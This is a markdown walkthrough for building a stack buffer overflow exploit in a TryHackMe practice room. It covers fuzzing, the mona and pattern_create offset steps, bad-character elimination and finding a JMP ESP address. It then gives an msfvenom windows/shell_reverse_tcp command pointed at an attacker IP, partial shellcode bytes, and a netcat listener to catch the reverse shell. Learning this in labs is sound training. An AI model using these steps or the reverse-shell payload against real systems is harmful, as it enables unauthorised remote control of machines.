# Stack Based Buffer Overflow Walkthrough
I will be using Tib3rius's Buffer Overflow Prep on TryHackMe for practise.
Link to room: https://tryhackme.com/room/bufferoverflowprep

## Mona Configuration
Run the following command on Immunity Debugger to make the process easier:
```
!mona config -set workingfolder c:\mona\%p
```

## Fuzzing
1. Open the application you are targetting on Immunity Debugger and hit start
2. Run `fuzzer.py` to identify the point that causes the application to crash
3. Note down the crash point of the application

## Offset
To identify the offset to the EIP address, we can generate a string with the pattern_create module from Metasploit.
Add 40 to the crash point found. 
```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l [crash point + 40]
```
Then,
1. Copy the output and place it in the payload variable of `exploit.py`.
2. Run the script and it should crash the application again.
3. Change the distance to the same length of the pattern you created and run the command on Immunity Debugger:
```
!mona findmsp -distance  [crash point + 40]
```
Mona will display the output of the command, or click "Window" menu and then "Log data" to view it.
Find a line that states `EIP contains normal pattern : ... (offset XXXX)`
Note down the offset and make the following changes to `exploit.py` script:
1. Update the offset variable
2. Set the payload variable to an empty string
3. Set the retn variable to `BBBB`

Restart the application in Immunity Debugger and run the modified script.
The EIP register should now be overwritten with B's: `42424242`

## Finding Bad Characters
Using Mona, we can generate a byte array and exclude the null byte,`\x00`, by default.
Execute the following command:
```
!mona bytearray -b "\x00"
```
Then, follow these steps:
1. Execute `badchars.py` to generate a string of bad chars from `\x01 to \xff`.
2. Update `exploit.py` and set the payload variable to the string created.
3. Restart the application in Immunity Debugger and run the script again.
4. Copy the address to which the ESP register points and use it in the following command:
```
!mona compare -f C:\mona\oscp\bytearray.bin -a <address>
```

A mona Memory comparison results window will appear indicating the characters that are different in memory to what they are in the generated `bytearray.bin` file.
Not all of these might be bad characters as sometimes:
1. Bad characters cause the next byte to get corrupted
2. Bad characters cause the rest of the string to get corrupted

Make a note of the bad characters and do the following:
1. Generate a new byte array in mona, specifying these new bad characters along with `\x00`
2. Remove the new bad characters in the payload variable in exploit.py

Restart the application in Immunity Debugger and run the script again.
Repeat the process until the results status returns `Unmodified`. This indicates that there are no more bad characters.

## Finding a JMP point

Run the following command in Immunity Debugger with the application running or in a crashed state.
Ensure that all the bad characters identified are added in.
```
!mona jmp -r esp -cpb "\x00"
```
The results should display in the 'Log data' window. Choose an address and update it in `exploit.py` by setting the `retn` variable to the address written backwards.
For example, if the address found is `\x01\x02\x03\x04`, write `\x04\x03\x02\x01` in `exploit.py`.

## Generate a Payload
We can finally generate our shellcode excluding the bad characters found:
```
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f c
```
Insert the string added to the payload variable in `exploit.py` in the following format:
```
payload = ("\xfc\xbb\xa1\x8a\x96\xa2\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x5d\x62\x14\xa2\x9d"
...
"\xf7\x04\x44\x8d\x88\xf2\x54\xe4\x8d\xbf\xd2\x15\xfc\xd0\xb6"
"\x19\x53\xd0\x92\x19\x53\x2e\x1d")
```
Ensure to place an open bracket at the start, and a close bracket at the end.

## Prepend NOPs
An encoder was used to generate the payload. Thus, some space in memory is needed for the payload to unpack itself. Ensure this happens by assigning the following string to the padding variable:
```
padding = "\x90" * 16
```

## Exploit
1. Start a Netcat listener on Kali
2. Restart the application in Immunity Debugger
3. Run `exploit.py`

You should catch a reverse shell!
